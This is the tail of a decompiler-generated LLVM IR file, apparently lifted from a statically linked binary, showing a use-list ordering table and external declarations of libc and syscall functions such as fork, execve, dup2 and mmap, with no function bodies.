210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 544, 545, 546, 547, 548, 549, 550, 551 }
  uselistorder i32* @ebx, { 16, 17, 18, 146, 147, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 206, 207, 1, 208, 209, 212, 213, 136, 137, 148, 2, 149, 150, 151, 214, 215, 216, 217, 218, 219, 220, 29, 221, 152, 153, 154, 155, 222, 223, 224, 14, 15, 0, 237, 238, 239, 256, 257, 258, 259, 11, 3, 8, 240, 250, 254, 255, 225, 226, 227, 228, 229, 236, 30, 32, 37, 38, 39, 40, 33, 34, 35, 9, 36, 106, 107, 42, 31, 41, 43, 108, 246, 247, 44, 45, 46, 47, 156, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 4, 171, 172, 157, 158, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 12, 184, 185, 186, 187, 188, 5, 189, 190, 191, 192, 193, 194, 195, 196, 197, 244, 245, 48, 49, 50, 260, 261, 262, 263, 264, 265, 266, 269, 270, 128, 129, 230, 6, 231, 232, 233, 234, 13, 7, 10, 235, 271, 272, 273, 274, 275, 210, 211, 85, 86, 242, 243, 124, 125, 134, 135, 138, 139, 248, 249, 202, 203, 267, 268, 140, 141, 204, 205, 120, 121, 142, 143, 144, 145, 241, 251, 252, 253, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 122, 123, 126, 127, 130, 131, 132, 133, 198, 199, 200, 201 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i32 @_strlen(i8*) local_unnamed_addr

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @vfork() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @dup2(i32, i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32* @mmap(i32*, i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @munmap(i32*, i32) local_unnamed_addr

declare i32 @wait4(i32, i32, i32, %rusage*) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

declare i64 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16 @__decompiler_undefined_function_4() local_unnamed_addr

declare i16* @__decompiler_undefined_function_5() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_6() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_7() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_8() local_unnamed_addr

declare %rusage* @__decompiler_undefined_function_9() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
